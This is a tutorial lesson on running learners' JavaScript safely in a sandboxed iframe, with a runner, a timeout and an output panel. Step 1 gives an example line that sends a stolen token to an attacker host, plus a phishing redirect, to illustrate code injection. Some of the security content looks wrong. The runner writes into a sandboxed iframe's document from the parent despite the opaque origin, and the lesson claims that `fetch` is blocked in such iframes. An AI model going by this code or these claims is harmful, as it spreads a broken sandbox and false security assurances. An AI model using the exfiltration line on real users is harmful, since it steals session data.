# Lesson 09 — Running User Code Safely

## What You Will Build

Add a Run button. The user's code executes. Output appears in a panel below the editor.
An infinite loop is caught and reported after a timeout rather than freezing the app.
This is the most security-critical lesson in the curriculum — running user-provided code
is the most dangerous thing a web application can do.

---

## What You Need to Know First

- Lesson 07: Monaco editor, `editorRef.current.getValue()`
- Lesson 08: `LessonContext`, the lesson state

---

## The Lesson

### Step 1 — Execution Environments

Code requires an **execution environment** to run — a JavaScript engine, a set of
available APIs (browser APIs? Node.js APIs? neither?), and a security sandbox.

The browser's JavaScript environment includes: `window`, `document`, `fetch`, `localStorage`,
`navigator`, `XMLHttpRequest`. This is the **global scope** — the set of names available
without importing anything.

When user code runs in this environment, it has access to all of these. The user's code
can:
- Read your app's DOM (`document.querySelector('.secret-data')`)
- Access your app's `localStorage` (session tokens, saved data)
- Make network requests on the user's behalf (`fetch('https://attacker.com/steal', { body: token })`)
- Navigate the browser (`window.location.href = 'http://phishing.site'`)

This is **code injection** — when user-provided code runs in your app's context, it can
do anything your app can do. This is not hypothetical. Every XSS attack is code injection.

### Step 2 — The Same-Origin Policy

The browser's primary security mechanism is the **same-origin policy**: a script loaded
from one origin cannot read data from a different origin.

**What an origin is:** An origin is the combination of scheme + domain + port.
- `https://codex-edu.com:443` — one origin
- `http://codex-edu.com:80` — different origin (different scheme)
- `https://api.codex-edu.com:443` — different origin (different subdomain)

The same-origin policy prevents `https://evil.com` from reading your app's `localStorage`
or cookies. But: code running in the same origin has the same access as your app's code.
If user code runs directly in your page, it is on the same origin — the same-origin policy
does not protect you.

### Step 3 — The iframe Sandbox

The solution: run user code in an **iframe** on a different origin (or with the `sandbox`
attribute), so the same-origin policy protects your app's data from the user's code.

**What an iframe is:** An `<iframe>` is an embedded browsing context — a browser window
within your page, with its own global scope, its own DOM, and (optionally) its own origin.

**The `sandbox` attribute restricts what the iframe can do:**

```html
<iframe sandbox="allow-scripts" src="about:blank"></iframe>
```

With `sandbox="allow-scripts"`:
- ✅ The iframe's JavaScript runs
- ❌ Cannot access the parent page's DOM or JavaScript
- ❌ Cannot access the parent page's cookies or localStorage
- ❌ Cannot submit forms
- ❌ Cannot navigate the top-level window
- ❌ Cannot open popups
- ❌ Cannot load plugins

The `sandbox` attribute turns off all capabilities by default, then you add back only
what is needed. This is **fail-safe defaults**: default to denial, grant explicitly.

**Why `eval()` is dangerous:**
`eval(userCode)` runs the user's code directly in your page's JavaScript context. The
user can access every variable in scope, call every function, read every DOM element.
`eval` is never the right tool for running user code.

### Step 4 — Message Passing for Communication

The parent page and the sandboxed iframe cannot share variables (different contexts).
They communicate via **message passing** — sending serialised data back and forth.

**What serialisation is:** To send an object from one JavaScript context to another,
you must convert it to a transportable format (a string). `JSON.stringify` converts an
object to a JSON string. `JSON.parse` converts a JSON string back to an object.

**Limitation:** `JSON.stringify` cannot represent everything. Functions are dropped.
Circular references throw an error. Dates become strings. Only plain JSON-compatible
values can cross the iframe boundary.

**`postMessage` explained:**
```typescript
// Parent page sending to iframe
iframe.contentWindow.postMessage({ type: 'run', code: userCode }, '*')

// Iframe receiving from parent
window.addEventListener('message', (event) => {
  if (event.data.type === 'run') {
    const code = event.data.code
    // execute code here
  }
})
```

`postMessage` is the browser API for cross-context message passing. It is used between:
- Parent page and iframe
- A page and a Web Worker (Lesson 37)
- A page and a VS Code extension webview
- The Electron renderer and main process (via `contextBridge`, Lesson 06)

### Step 5 — Building the Sandbox Runner

Create `src/runner/sandbox.ts`:

```typescript
export interface ExecutionResult {
  readonly stdout: string[]
  readonly stderr: string[]
  readonly timedOut: boolean
}

export function createSandboxRunner(): {
  run: (code: string) => Promise<ExecutionResult>
  cleanup: () => void
} {
  let iframe: HTMLIFrameElement | null = null

  function createIframe() {
    const newIframe = document.createElement('iframe')
    newIframe.setAttribute('sandbox', 'allow-scripts')
    newIframe.style.display = 'none'
    document.body.appendChild(newIframe)
    return newIframe
  }

  function run(code: string): Promise<ExecutionResult> {
    return new Promise((resolve) => {
      // Create a fresh iframe for each run
      if (iframe !== null) {
        iframe.remove()
      }
      iframe = createIframe()

      const stdout: string[] = []
      const stderr: string[] = []

      // Timeout: if code runs for more than 5 seconds, kill it
      const timeoutId = setTimeout(() => {
        if (iframe !== null) {
          iframe.remove()
          iframe = null
        }
        resolve({ stdout, stderr, timedOut: true })
      }, 5000)

      // Listen for output messages from the iframe
      function handleMessage(event: MessageEvent) {
        if (event.source !== iframe?.contentWindow) return

        if (event.data.type === 'stdout') {
          stdout.push(event.data.line)
        } else if (event.data.type === 'stderr') {
          stderr.push(event.data.line)
        } else if (event.data.type === 'done') {
          clearTimeout(timeoutId)
          window.removeEventListener('message', handleMessage)
          resolve({ stdout, stderr, timedOut: false })
        }
      }

      window.addEventListener('message', handleMessage)

      // Inject the runner script and user code into the iframe
      const runnerScript = buildRunnerScript(code)
      iframe.contentWindow?.document.open()
      iframe.contentWindow?.document.write(`
        <script>
          ${runnerScript}
        </script>
      `)
      iframe.contentWindow?.document.close()
    })
  }

  function cleanup() {
    if (iframe !== null) {
      iframe.remove()
      iframe = null
    }
  }

  return { run, cleanup }
}
```

**`document.createElement('iframe')` explained:**
`document.createElement(tagName)` creates a new DOM element — an in-memory HTML element
not yet attached to the page. `setAttribute('sandbox', 'allow-scripts')` sets the sandbox
attribute. `style.display = 'none'` hides the iframe (it is only needed for execution,
not for display). `document.body.appendChild(iframe)` adds it to the page — it must be
in the DOM for its `contentWindow` to be accessible.

**`new Promise((resolve) => { ... })` explained:**
`new Promise` creates a Promise — an object representing a future value. The function
passed to the constructor is called immediately with a `resolve` function. Calling
`resolve(value)` fulfils the Promise and delivers the value to any `.then()` handler
or `await` expression waiting on it.

This pattern (wrapping callback-based code in a Promise) is common for browser APIs
that use callbacks rather than Promises.

**`event.source !== iframe?.contentWindow` — security check:**
Before processing a message, verify it came from the expected iframe. Without this check,
any script on the page could send messages that appear to be execution results. This is
an **origin check** — verifying the source of data before trusting it.

**The runner script:**

```typescript
function buildRunnerScript(userCode: string): string {
  // Override console methods to capture output instead of printing to DevTools
  return `
    (function() {
      const capturedLog = []
      const originalConsole = {
        log: console.log,
        error: console.error,
      }

      console.log = function(...args) {
        const line = args.map(arg =>
          typeof arg === 'object' ? JSON.stringify(arg) : String(arg)
        ).join(' ')
        window.parent.postMessage({ type: 'stdout', line }, '*')
      }

      console.error = function(...args) {
        const line = args.map(arg => String(arg)).join(' ')
        window.parent.postMessage({ type: 'stderr', line }, '*')
      }

      try {
        ${userCode}
        window.parent.postMessage({ type: 'done' }, '*')
      } catch (error) {
        window.parent.postMessage({
          type: 'stderr',
          line: error instanceof Error ? error.message : String(error)
        }, '*')
        window.parent.postMessage({ type: 'done' }, '*')
      }
    })()
  `
}
```

**The IIFE pattern:**
`(function() { ... })()` is an **immediately invoked function expression (IIFE)**. The
function is defined and called immediately. This creates a private scope — variables
inside the IIFE do not leak to the iframe's global scope. Without it, `capturedLog`
would be a global variable the user's code could accidentally overwrite.

**Why override `console.log`:** In a sandboxed iframe, the user's `console.log` output
would go to the browser's DevTools console — invisible to the app. By replacing
`console.log` with our own version that sends messages to the parent, we capture the
output and can display it.

### Step 6 — The Security Constraints

**What the sandbox prevents:**
- Reading your app's `localStorage` — user tokens are safe
- Reading your app's DOM — no access to your app's content
- Navigating the page — cannot redirect to a phishing site
- Accessing cookies — cannot steal session data

**What the sandbox does not prevent:**
- An infinite loop — the `while (true) {}` still runs, freezing the iframe.
  This is handled by the 5-second timeout.
- Excessive memory allocation — `const array = []; while(true) array.push(array)`.
  The browser will eventually kill the tab.
- Network requests to third-party APIs — `fetch` is blocked by default in sandboxed
  iframes without `allow-same-origin`, but attaching `allow-same-origin` would defeat
  the sandbox. Without it, `fetch` throws. This is acceptable for a code learning tool.

**Defence in depth:**
Multiple layers of protection, not one:
1. `sandbox` attribute — restricts iframe capabilities
2. Message origin check — verifies messages come from our iframe
3. 5-second timeout — catches infinite loops
4. `try/catch` in the runner script — catches runtime errors

No single protection is sufficient; each layer guards against a different failure mode.

### Step 7 — The Output Panel Component

Create `src/components/OutputPanel.tsx`:

```typescript
import { StyleSheet, Text, View, ScrollView } from 'react-native'
import type { ExecutionResult } from '../runner/sandbox'
import { colors, spacing, typography } from '../theme'

interface OutputPanelProps {
  readonly result: ExecutionResult | null
  readonly isRunning: boolean
}

export function OutputPanel({ result, isRunning }: OutputPanelProps) {
  if (isRunning) {
    return (
      <View style={styles.container}>
        <Text style={styles.running}>Running…</Text>
      </View>
    )
  }

  if (result === null) return null

  return (
    <View style={styles.container}>
      {result.timedOut && (
        <Text style={styles.error}>⚠ Execution timed out after 5 seconds</Text>
      )}
      {result.stdout.map((line, index) => (
        <Text key={index} style={styles.output}>{line}</Text>
      ))}
      {result.stderr.map((line, index) => (
        <Text key={index} style={styles.error}>{line}</Text>
      ))}
      {result.stdout.length === 0 && result.stderr.length === 0 && !result.timedOut && (
        <Text style={styles.noOutput}>[No output]</Text>
      )}
    </View>
  )
}
```

**`key={index}` in list rendering:**
When rendering an array of elements, React requires a `key` prop — a stable unique
identifier for each element. React uses keys to track which elements changed between
renders. Without keys, React may re-render or reorder elements incorrectly.
Using the array index as a key is acceptable when the list is static (not reordered
or filtered). For dynamic lists, use a stable ID from the data.

---

## Connect the Pieces

The `sandbox` + `postMessage` model used here is the same isolation model used by
Electron's `contextBridge` (Lesson 06) and by VS Code extensions (the webview runs
in a sandboxed iframe). The pattern — execute untrusted code in a restricted context,
communicate via message passing — is universal.

The IIFE pattern for private scope appears throughout JavaScript: npm packages use it
to avoid polluting the global scope, polyfills wrap themselves in IIFEs, old minifiers
wrap entire codebases in IIFEs. It is the `{}` scope boundary before ES modules existed.

In Lesson 37 (concurrency), Web Workers will provide a similar isolation model —
code in a Worker cannot access the main page's DOM, and communication is via message
passing. The model is the same; Workers provide true thread parallelism where iframes
provide security isolation.

---

## What Breaks Without This

Without the origin check on `event.source`, any script running in your page could post
a fake `{ type: 'done' }` message and terminate a running execution early, or inject
fake output. The security model relies on verifying who sent each message.

Without the 5-second timeout, `while (true) {}` in user code freezes the iframe.
The iframe's event loop is blocked; no messages can be sent to the parent. The Run
button shows "Running…" forever. The app appears hung.

---

## Definition of Done

- [ ] Clicking Run executes the code and displays `console.log` output
- [ ] A `console.log("hello")` in the editor shows `hello` in the output panel
- [ ] An infinite loop (`while (true) {}`) is reported as "timed out after 5 seconds"
- [ ] A runtime error (calling an undefined function) shows the error message in red
- [ ] The output panel shows "[No output]" when code runs successfully but prints nothing
- [ ] You can answer: what is code injection and why is `eval(userCode)` dangerous?
- [ ] You can answer: what does the `sandbox` attribute do and what does `allow-scripts` specifically permit?
- [ ] You can answer: what is the same-origin policy and how does the iframe enforce it?
- [ ] You can answer: what is defence in depth and how many layers protect the runner?
- [ ] `git commit` with a message explaining why — "Add sandboxed iframe code runner — isolates user code from app context"
